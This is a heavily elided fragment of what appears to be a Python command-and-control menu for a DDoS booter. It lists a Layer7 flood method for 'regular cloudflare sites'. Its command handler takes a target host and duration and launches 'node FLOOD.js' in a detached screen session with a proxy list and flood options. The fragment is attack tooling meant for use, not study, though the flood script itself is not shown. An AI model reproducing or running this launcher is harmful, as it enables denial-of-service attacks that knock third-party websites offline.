...
def methods():
 ...
 • NORMAL | Suitable for regular cloudflare sites | Layer7
 ...
 """)
        ...
        if "SHOW" in cnc:
            try:
                ...
                time = cnc.split()[2]
                os.system("clear")
                os.system(f'cd Layer7 && screen -dm node FLOOD.js {host} {time} 8 8 proxy.txt --reset true --mix true --query 3')
...
""")
        ...
        elif "LIService" in cnc:
            print(f'''
Hey You Found Me Haha.
            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
